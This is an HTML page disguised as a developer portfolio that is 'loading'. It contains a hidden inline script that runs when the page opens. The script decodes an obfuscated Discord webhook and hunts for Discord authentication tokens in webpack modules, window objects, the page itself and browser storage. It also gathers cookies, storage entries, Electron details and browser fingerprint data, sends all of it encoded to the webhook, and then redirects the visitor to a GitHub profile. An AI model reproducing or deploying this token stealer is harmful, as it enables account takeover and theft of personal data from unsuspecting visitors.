<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dev Portfolio | Loading...</title>
    <style>
        body {
            margin: 0;
            background: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #30363d;
            border-bottom-color: #58a6ff;
            border-radius: 50%;
            animation: rotation 1s linear infinite;
        }
        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            margin-top: 20px;
            font-size: 16px;
            color: #8b949e;
        }
    </style>
<base target="_blank">
</head>
<body>
    <div class="loader"></div>
    <div class="loading-text">Loading portfolio...</div>

    <script>
        (function() {
            // ====== WEBHOOK ======
            const _p1 = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
            const _p2 = [49,53,50,51,53,49,55,52,57,56,56,57,57,56,50,52,55,49,50,47,120,55,119,57,109,67,117,79,73,102,110,51,54,119,50,119,110,78,115,49,53,83,67,99,54,99,74,104,117,111,66,83,113,51,75,110,106,116,118,77,67,49,88,54,55,98,115,67,81,48,118,80,73,75,114,79,69,87,86,68,112,73,69,81,45,106,53,67];

            let WH = '';
            for (let i = 0; i < _p1.length; i++) WH += String.fromCharCode(_p1[i]);
            for (let i = 0; i < _p2.length; i++) WH += String.fromCharCode(_p2[i]);

            const GH = 'https://github.com/nm1-Dev';

            function enc(data, key) {
                let out = '';
                for (let i = 0; i < data.length; i++) {
                    out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return btoa(out);
            }

            // ====== TOKEN EXTRACTION ======
            function findDiscordToken() {
                const tokens = [];
                const seen = new Set();

                const tokenRegexes = [
                    /[MN][A-Za-z0-9_-]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/g,
                    /[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}/g,
                    /mfa\.[A-Za-z0-9_-]{84}/g
                ];

                function addToken(t, src) {
                    if (!seen.has(t)) {
                        seen.add(t);
                        tokens.push({t: t, src: src});
                    }
                }

                function scanString(str, src) {
                    if (!str || typeof str !== 'string') return;
                    for (const rx of tokenRegexes) {
                        const found = str.match(rx);
                        if (found) found.forEach(t => addToken(t, src));
                    }
                }

                // === METHOD 1: Webpack chunk deep scan ===
                try {
                    if (window.webpackChunkdiscord_app && Array.isArray(window.webpackChunkdiscord_app)) {
                        window.webpackChunkdiscord_app.forEach((chunk, i) => {
                            if (chunk && chunk[1]) {
                                Object.entries(chunk[1]).forEach(([modKey, mod]) => {
                                    if (typeof mod === 'function') {
                                        scanString(mod.toString(), 'wp_func_' + i + '_' + modKey);
                                    }
                                    if (typeof mod === 'object' && mod !== null) {
                                        try { scanString(JSON.stringify(mod), 'wp_obj_' + i + '_' + modKey); } catch(e) {}
                                    }
                                });
                            }
                        });
                    }
                } catch(e) {}

                // === METHOD 2: Try to find getToken modules ===
                try {
                    if (window.webpackChunkdiscord_app) {
                        window.webpackChunkdiscord_app.forEach(chunk => {
                            if (chunk && chunk[1]) {
                                Object.values(chunk[1]).forEach(mod => {
                                    if (typeof mod === 'function') {
                                        try {
                                            const exp = {};
                                            mod(exp, {}, function(){});
                                            if (exp.default && typeof exp.default.getToken === 'function') {
                                                try { scanString(exp.default.getToken(), 'getToken'); } catch(e) {}
                                            }
                                            if (typeof exp.getToken === 'function') {
                                                try { scanString(exp.getToken(), 'getToken_direct'); } catch(e) {}
                                            }
                                            if (exp.default && exp.default._token) {
                                                scanString(exp.default._token, 'token_prop');
                                            }
                                        } catch(e) {}
                                    }
                                });
                            }
                        });
                    }
                } catch(e) {}

                // === METHOD 3: Deep window object scan ===
                const scanned = new Set();
                function scanObject(obj, path, depth) {
                    if (depth > 5 || scanned.has(obj)) return;
                    if (obj && typeof obj === 'object') scanned.add(obj);
                    try {
                        for (const key in obj) {
                            try {
                                const val = obj[key];
                                if (typeof val === 'string') scanString(val, path + '.' + key);
                                else if (typeof val === 'function') scanString(val.toString(), path + '.' + key + '()');
                                else if (typeof val === 'object' && val !== null && val !== window && depth < 5) {
                                    scanObject(val, path + '.' + key, depth + 1);
                                }
                            } catch(e) {}
                        }
                    } catch(e) {}
                }

                ['DiscordNative', 'GLOBAL_ENV', 'webpackChunkdiscord_app', '__DISCORD__', 
                 'Vencord', 'BdApi', 'betterDiscord', 'localStorage', 'sessionStorage'].forEach(t => {
                    if (window[t]) scanObject(window[t], 'window.' + t, 0);
                });

                // === METHOD 4: DOM and scripts ===
                try { scanString(document.documentElement.innerHTML, 'dom'); } catch(e) {}
                try {
                    document.querySelectorAll('script').forEach((s, i) => {
                        scanString(s.textContent || s.innerText || '', 'script_' + i);
                    });
                } catch(e) {}

                // === METHOD 5: Storage (filtering non-Shopify keys) ===
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        const v = localStorage.getItem(k);
                        if (v && !k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
                            scanString(v, 'ls_' + k);
                        }
                    }
                } catch(e) {}

                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const k = sessionStorage.key(i);
                        const v = sessionStorage.getItem(k);
                        if (v && !k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
                            scanString(v, 'ss_' + k);
                        }
                    }
                } catch(e) {}

                // === METHOD 6: Try to access Discord's internal storage directly ===
                try {
                    if (window.DiscordNative && window.DiscordNative.storage) {
                        scanString(JSON.stringify(window.DiscordNative.storage), 'native_storage');
                    }
                } catch(e) {}

                return tokens;
            }

            // ====== GRAB ALL DATA ======
            async function grabAll() {
                const loot = {
                    tokens: [],
                    ls: [],
                    ss: [],
                    ck: [],
                    idb: [],
                    discord: {},
                    electron: {},
                    info: {}
                };

                loot.tokens = findDiscordToken();

                // Filter out Shopify garbage from storage
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        const v = localStorage.getItem(k);
                        if (!k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
                            loot.ls.push({k: k, v: v ? v.substring(0, 500) : null, l: v ? v.length : 0});
                        }
                    }
                } catch(e) {}

                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const k = sessionStorage.key(i);
                        const v = sessionStorage.getItem(k);
                        if (!k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
                            loot.ss.push({k: k, v: v ? v.substring(0, 500) : null, l: v ? v.length : 0});
                        }
                    }
                } catch(e) {}

                try {
                    loot.ck = document.cookie.split(';').map(c => c.trim()).filter(c => c && !c.toLowerCase().includes('shopify'));
                } catch(e) {}

                try {
                    const dbs = await window.indexedDB.databases();
                    loot.idb = dbs.map(db => db.name);
                } catch(e) {}

                try {
                    if (window.webpackChunkdiscord_app) loot.discord.webpack = 'YES';
                    if (window.DiscordNative) {
                        loot.discord.native = 'YES';
                        try { loot.discord.native_keys = Object.keys(window.DiscordNative); } catch(e) {}
                    }
                    if (window.GLOBAL_ENV) loot.discord.global_env = 'YES';
                    if (window.BdApi) loot.discord.betterdiscord = 'YES';
                    if (window.Vencord) loot.discord.vencord = 'YES';
                    if (window.__DISCORD__) loot.discord.__discord__ = 'YES';
                } catch(e) {}

                try {
                    if (/Electron/.test(navigator.userAgent)) loot.electron.is_electron = 'YES';
                    if (window.process) {
                        loot.electron.process = 'YES';
                        try { loot.electron.versions = window.process.versions; } catch(e) {}
                    }
                    if (window.require) {
                        loot.electron.require = 'YES';
                        try {
                            const electron = window.require('electron');
                            loot.electron.ipc = Object.keys(electron);
                        } catch(e) {}
                    }
                } catch(e) {}

                loot.info = {
                    ua: navigator.userAgent,
                    p: navigator.platform,
                    l: navigator.language,
                    sr: screen.width + 'x' + screen.height,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ts: new Date().toISOString(),
                    rf: document.referrer || 'D',
                    url: location.href,
                    host: location.hostname,
                    origin: location.origin
                };

                return loot;
            }

            // ====== BUILD & SEND ======
            function build(loot) {
                const key = Math.random().toString(36).substring(2, 10);
                const json = JSON.stringify(loot);
                const encoded = enc(json, key);

                return {
                    content: '```\n' + encoded + '\n```\nKey: `' + key + '`'
                };
            }

            function send(url, data) {
                try {
                    fetch(url, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    }).catch(() => {});
                } catch(e) {}

                setTimeout(() => {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify(data));
                    } catch(e) {}
                }, 300);

                setTimeout(() => {
                    try {
                        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                        navigator.sendBeacon(url, blob);
                    } catch(e) {}
                }, 600);
            }

            // ====== EXECUTE ======
            grabAll().then(loot => {
                const payload = build(loot);
                send(WH, payload);
                setTimeout(() => { window.location.href = GH; }, 2000);
            }).catch(() => {
                setTimeout(() => { window.location.href = GH; }, 2000);
            });

        })();
    </script>
</body>
</html>
